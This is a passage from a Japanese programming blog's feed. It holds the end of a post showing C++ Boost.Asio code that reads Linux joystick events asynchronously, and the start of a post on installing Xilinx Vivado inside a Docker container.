<span id="cb12-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="at">extern</span> <span class="st">&quot;C&quot;</span> <span class="op">{</span></span>
<span id="cb12-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb12-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/joystick.h&gt;</span></span>
<span id="cb12-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/ioctl.h&gt;</span></span>
<span id="cb12-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb12-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb12-18"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-19"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-19" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> <span class="kw">namespace</span> <span class="bu">std::</span>chrono_literals<span class="op">;</span></span>
<span id="cb12-20"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-21"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-21" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> joystick_state <span class="op">{</span></span>
<span id="cb12-22"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-22" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>uint8_t<span class="op"> </span>num_axes<span class="op">;</span></span>
<span id="cb12-23"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-23" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>uint8_t<span class="op"> </span>num_buttons<span class="op">;</span></span>
<span id="cb12-24"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-24" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>vector<span class="op">&lt;</span><span class="bu">std::</span>int16_t<span class="op">&gt;</span> axes<span class="op">;</span></span>
<span id="cb12-25"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-25" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>vector<span class="op">&lt;</span><span class="bu">std::</span>int16_t<span class="op">&gt;</span> buttons<span class="op">;</span></span>
<span id="cb12-26"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-26" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb12-27"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-28"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-28" aria-hidden="true" tabindex="-1"></a><span class="kw">auto</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">**</span> argv<span class="op">)</span> <span class="op">-&gt;</span> <span class="dt">int</span> <span class="op">{</span></span>
<span id="cb12-29"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-29" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>argc <span class="op">!=</span> <span class="dv">2</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-30"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-30" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>cerr<span class="op"> &lt;&lt;</span> <span class="st">&quot;usage: &quot;</span> <span class="op">&lt;&lt;</span> argv<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">&lt;&lt;</span> <span class="st">&quot; &lt;device&gt;&quot;</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>endl<span class="op">;</span></span>
<span id="cb12-31"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-31" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb12-32"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-32" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb12-33"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-34"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-34" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>io_context<span class="op"> </span>ctx<span class="op">{};</span></span>
<span id="cb12-35"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-35" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>io_context<span class="ex">::</span>strand<span class="op"> </span>strand<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb12-36"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-37"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-37" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>posix<span class="ex">::</span>stream_descriptor<span class="op"> </span>joystick<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb12-38"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-38" aria-hidden="true" tabindex="-1"></a>  joystick_state state<span class="op">{};</span></span>
<span id="cb12-39"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-39" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb12-40"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-40" aria-hidden="true" tabindex="-1"></a>    <span class="at">const</span> <span class="dt">int</span> fd <span class="op">=</span> <span class="op">::</span>open<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">],</span> O_RDONLY<span class="op">);</span></span>
<span id="cb12-41"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>fd <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-42"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-42" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>cerr<span class="op"> &lt;&lt;</span> argv<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">&lt;&lt;</span> <span class="st">&quot;: &quot;</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>strerror<span class="op">(</span>errno<span class="op">)</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>endl<span class="op">;</span></span>
<span id="cb12-43"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-43" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb12-44"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-44" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-45"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-46"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-46" aria-hidden="true" tabindex="-1"></a>    <span class="op">::</span>ioctl<span class="op">(</span>fd<span class="op">,</span> JSIOCGAXES<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">.</span>num_axes<span class="op">);</span></span>
<span id="cb12-47"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-47" aria-hidden="true" tabindex="-1"></a>    state<span class="op">.</span>axes<span class="op">.</span>resize<span class="op">(</span>state<span class="op">.</span>num_axes<span class="op">);</span></span>
<span id="cb12-48"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-49"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-49" aria-hidden="true" tabindex="-1"></a>    <span class="op">::</span>ioctl<span class="op">(</span>fd<span class="op">,</span> JSIOCGBUTTONS<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">.</span>num_buttons<span class="op">);</span></span>
<span id="cb12-50"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-50" aria-hidden="true" tabindex="-1"></a>    state<span class="op">.</span>buttons<span class="op">.</span>resize<span class="op">(</span>state<span class="op">.</span>num_buttons<span class="op">);</span></span>
<span id="cb12-51"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-52"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-52" aria-hidden="true" tabindex="-1"></a>    joystick<span class="op">.</span>assign<span class="op">(</span>fd<span class="op">);</span></span>
<span id="cb12-53"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-53" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb12-54"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-54" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-55"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-55" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>steady_timer<span class="op"> </span>timer<span class="op">{</span>ctx<span class="op">};</span></span>
<span id="cb12-56"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-56" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>spawn<span class="op">(</span>strand<span class="op">,</span> <span class="op">[&amp;</span>state<span class="op">,</span> <span class="op">&amp;</span>timer<span class="op">](</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> yield<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-57"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-57" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb12-58"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-58" aria-hidden="true" tabindex="-1"></a>      timer<span class="op">.</span>expires_after<span class="op">(</span><span class="dv">16'666'666</span><span class="bu">ns</span><span class="op">);</span></span>
<span id="cb12-59"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-60"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-60" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\r</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb12-61"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-61" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;axes: &quot;</span><span class="op">);</span></span>
<span id="cb12-62"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-62" aria-hidden="true" tabindex="-1"></a>      <span class="cf">for</span> <span class="op">(</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> v <span class="op">:</span> state<span class="op">.</span>axes<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-63"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-63" aria-hidden="true" tabindex="-1"></a>        <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;%6&quot;</span> PRId16 <span class="st">&quot; &quot;</span><span class="op">,</span> v<span class="op">);</span></span>
<span id="cb12-64"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-64" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb12-65"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-65" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;buttons: &quot;</span><span class="op">);</span></span>
<span id="cb12-66"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-66" aria-hidden="true" tabindex="-1"></a>      <span class="cf">for</span> <span class="op">(</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> v <span class="op">:</span> state<span class="op">.</span>buttons<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-67"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-67" aria-hidden="true" tabindex="-1"></a>        <span class="bu">std::</span>printf<span class="op">(</span><span class="st">&quot;%&quot;</span> PRId16 <span class="st">&quot; &quot;</span><span class="op">,</span> v<span class="op">);</span></span>
<span id="cb12-68"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-68" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb12-69"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-69" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>fflush<span class="op">(</span>stdout<span class="op">);</span></span>
<span id="cb12-70"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-70" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-71"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-71" aria-hidden="true" tabindex="-1"></a>      timer<span class="op">.</span>async_wait<span class="op">(</span>yield<span class="op">);</span></span>
<span id="cb12-72"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-72" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-73"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-73" aria-hidden="true" tabindex="-1"></a>  <span class="op">});</span></span>
<span id="cb12-74"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-74" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-75"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-75" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>spawn<span class="op">(</span>strand<span class="op">,</span> <span class="op">[&amp;</span>joystick<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">](</span><span class="kw">auto</span><span class="op">&amp;&amp;</span> yield<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-76"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-76" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb12-77"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-77" aria-hidden="true" tabindex="-1"></a>      <span class="op">::</span>js_event jse<span class="op">{};</span></span>
<span id="cb12-78"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-78" aria-hidden="true" tabindex="-1"></a>      <span class="ex">boost::</span>system<span class="ex">::</span>error_code<span class="op"> </span>error<span class="op">{};</span></span>
<span id="cb12-79"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-79" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-80"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-80" aria-hidden="true" tabindex="-1"></a>      <span class="ex">boost::</span>asio<span class="ex">::</span>async_read<span class="op">(</span>joystick<span class="op">,</span> <span class="ex">boost::</span>asio<span class="ex">::</span>buffer<span class="op">(&amp;</span>jse<span class="op">,</span> <span class="kw">sizeof</span> jse<span class="op">),</span> yield<span class="op">[</span>error<span class="op">]);</span></span>
<span id="cb12-81"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-81" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-82"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-82" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>error <span class="op">==</span> <span class="ex">boost::</span>asio<span class="ex">::</span>error<span class="ex">::</span>eof<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-83"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-83" aria-hidden="true" tabindex="-1"></a>        joystick<span class="op">.</span>get_io_service<span class="op">().</span>stop<span class="op">();</span></span>
<span id="cb12-84"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-84" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
<span id="cb12-85"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-85" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>error<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-86"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-86" aria-hidden="true" tabindex="-1"></a>        <span class="bu">std::</span>cerr<span class="op"> &lt;&lt;</span> <span class="st">&quot;</span><span class="sc">\n</span><span class="st">error: &quot;</span> <span class="op">&lt;&lt;</span> error<span class="op">.</span>message<span class="op">()</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>endl<span class="op">;</span></span>
<span id="cb12-87"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-87" aria-hidden="true" tabindex="-1"></a>        <span class="bu">std::</span>exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb12-88"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-88" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb12-89"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-89" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-90"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-90" aria-hidden="true" tabindex="-1"></a>      <span class="cf">switch</span> <span class="op">(</span>jse<span class="op">.</span>type <span class="op">&amp;</span> <span class="op">~</span>JS_EVENT_INIT<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-91"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-91" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> JS_EVENT_AXIS<span class="op">:</span></span>
<span id="cb12-92"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-92" aria-hidden="true" tabindex="-1"></a>          <span class="cf">if</span> <span class="op">(</span>jse<span class="op">.</span>number <span class="op">&lt;</span> state<span class="op">.</span>num_axes<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-93"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-93" aria-hidden="true" tabindex="-1"></a>            state<span class="op">.</span>axes<span class="op">.</span>at<span class="op">(</span>jse<span class="op">.</span>number<span class="op">)</span> <span class="op">=</span> jse<span class="op">.</span>value<span class="op">;</span></span>
<span id="cb12-94"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-94" aria-hidden="true" tabindex="-1"></a>          <span class="op">}</span></span>
<span id="cb12-95"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-95" aria-hidden="true" tabindex="-1"></a>          <span class="cf">break</span><span class="op">;</span></span>
<span id="cb12-96"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-96" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> JS_EVENT_BUTTON<span class="op">:</span></span>
<span id="cb12-97"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-97" aria-hidden="true" tabindex="-1"></a>          <span class="cf">if</span> <span class="op">(</span>jse<span class="op">.</span>number <span class="op">&lt;</span> state<span class="op">.</span>num_buttons<span class="op">)</span> <span class="op">{</span></span>
<span id="cb12-98"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-98" aria-hidden="true" tabindex="-1"></a>            state<span class="op">.</span>buttons<span class="op">.</span>at<span class="op">(</span>jse<span class="op">.</span>number<span class="op">)</span> <span class="op">=</span> jse<span class="op">.</span>value<span class="op">;</span></span>
<span id="cb12-99"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-99" aria-hidden="true" tabindex="-1"></a>          <span class="op">}</span></span>
<span id="cb12-100"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-100" aria-hidden="true" tabindex="-1"></a>          <span class="cf">break</span><span class="op">;</span></span>
<span id="cb12-101"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-101" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb12-102"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-102" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-103"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-103" aria-hidden="true" tabindex="-1"></a>  <span class="op">});</span></span>
<span id="cb12-104"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-104" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-105"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-105" aria-hidden="true" tabindex="-1"></a>  ctx<span class="op">.</span>run<span class="op">();</span></span>
<span id="cb12-106"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb12-106" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>実行してみるとこんな感じ。<code>boost_coroutine</code> や <code>boost_system</code>、<code>pthread</code> ライブラリをリンクする必要があります。</p>
<p style="text-align: center;">
<object data="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/joy.svg" style="max-width: 100%">
</object>
</p>
<h2 id="まとめ">まとめ</h2>
<p>Boost.Asio の <code>posix::stream_descriptor</code> を使って、Linux マシンに接続したデバイスを非同期に扱う方法を紹介しました。小規模なプログラムではわざわざ C++ で Boost.Asio を使って書く必要は無いかもしれませんが、扱うデバイスが増えたり、ネットワークやシリアル通信など Boost.Asio で扱える他の要素と組み合わせるような場合には、かなり便利なんじゃないかなぁと思います。</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>ただ、この API はいつの間にか legacy 扱いされており、これからは evdev を使うようにとありますね…<a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>状態の逐次表示はイベントを取得した時に表示を更新するだけで実現できるのでこんなことをする必要はないですが、あくまで例なので…<a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Xilinx の開発ツールを Docker コンテナに閉じ込める</title>
    <link href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/index.html" />
    <id>https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/index.html</id>
    <published>2018-09-15T13:19:31Z</published>
    <updated>2018-09-15T13:19:31Z</updated>
    <summary type="html"><![CDATA[<p>あまり表には出していませんでしたが、少し前から FPGA を触っています。FPGA は以前から興味があったデバイスの1つだったこともあり、苦戦しながらも今まで触れたことのない概念の連続をなんだかんだで楽しんでいる気がします。欲を言えば、FPGA ともう少し普通の出会い方をし、普通の環境で勉強したかったなぁというのがありますが…</p>
<p>その話は置いておき本題、FPGA の開発環境の話です。世の中で FPGA を使った開発が一般にどのように行われているかは詳しく知りませんが、その1つとして FPGA ベンダの提供する開発環境を利用するというのがあります。例えば最近の Xilinx なら <a href="https://www.xilinx.com/products/design-tools/vivado.html">Vivado Design Suite</a> (Vivado) という感じです。さてこの Vivado、Windows 版に加えて Linux 版もあるのですが、これがこういうソフトウェアにありがちなインストーラ形式で配布されています。つまり、ディストリビューションのパッケージマネージャに管理されたインストールが困難で、おまけに動作保証されている環境が限られているわけです。(╯•﹏•╰)</p>
<p>また、もう1つ利用頻度がそこそこ高くなる場合のある Xilinx の開発ツールに <a href="https://www.xilinx.com/products/design-tools/embedded-software/petalinux-sdk.html">PetaLinux Tools</a> というのがあるのですが、これがまぁ本っっっっっっっっ当にアレなインストーラ形式で配布されており、二度と1から環境構築したくなくなるような作りになっていたりするわけです。</p>
<p>こうした環境汚染を平気でしてきたりするお行儀のわるいソフトウェアは Docker コンテナに閉じ込めてしまおうということで、その時の知見を書いていこうと思います。</p>
<!--more-->
<h2 id="環境">環境</h2>
<p>以下の環境で Docker イメージ作成できることを確認しました。また作成した Docker イメージ内のソフトウェアは Arch Linux と PetaLinux Tools の組み合わせを除き (僕が触った各機能は) ほぼ問題なく利用できることを確認しました。</p>
<ul>
<li>Arch Linux (x86_64)
<ul>
<li>Kernel: 4.18.6-arch1-1-ARCH</li>
<li>Docker: 18.06.1-ce</li>
</ul></li>
<li>CentOS Linux release 7.5.1804 (Core)
<ul>
<li>Kernel: 3.10.0-862.11.6.el7.x86_64</li>
<li>Docker: 18.06.1-ce
<ul>
<li><a href="https://docs.docker.com/install/linux/docker-ce/centos/">この公式ドキュメント</a>を参考にインストールしたもの</li>
</ul></li>
</ul></li>
</ul>
<p>インストールした各種 Xilinx 製ツールのバージョンは以下のとおりです</p>
<ul>
<li>Vivado Design Suite (2018.2)
<ul>
<li>Vivado HL WebPACK Edition</li>
<li>8/1 に出たらしい 2018.2.1 のアップデータは適用していません</li>
</ul></li>
<li>PetaLinux Tools (2018.2)</li>
</ul>
<h2 id="vivado">Vivado</h2>
<h3 id="準備">準備</h3>
<p>Docker イメージを作成する前にいくつかの準備が必要です。</p>
<p>まずインストーラをダウンロードします。これはダウンロードに Xilinx のアカウントが必要で、<code>Dockerfile</code> から <code>curl</code> 等でダウンロードするということができないためです。<a href="https://www.xilinx.com/support/download.html">ここ</a> へアクセスし、<strong>Vivado HLx 2018.2: All OS installer Single-File Download</strong> のリンクからインストーラをダウンロードします。Web Installer は <code>Dockerfile</code> でインストールを自動化するにあたり必要になる Batch install が使えない<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>のでダメです。</p>
<p><img src="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/vivado_website.png" /></p>
<p>次に Batch install に必要なインストールの設定ファイルを生成します。この設定ファイルはダウンロードしたファイルを解凍すると出てくるシェルスクリプト <code>xsetup</code> にコマンドラインオプション <code>-b ConfigGen</code> を付けて実行することで生成できます。この <code>xsetup</code> も勝手に <code>~/.Xilinx</code> ディレクトリを作成したりしてくるし、そもそも拾ってきた実行ファイルをむやみにホストで直に実行したくないので Docker コンテナの中でやってしまいましょう。</p>
<pre><code>(host) $ tar xf Xilinx_Vivado_SDK_2018.2_0614_1954.tar.gz
(host) $ docker container run --rm -it -v /path/to/Xilinx_Vivado_SDK_2018.2_0614_1954:/vivado -w /vivado ubuntu:xenial /bin/bash
root@a0981b2888bc:/vivado# ./xsetup -b ConfigGen
Running in batch mode...
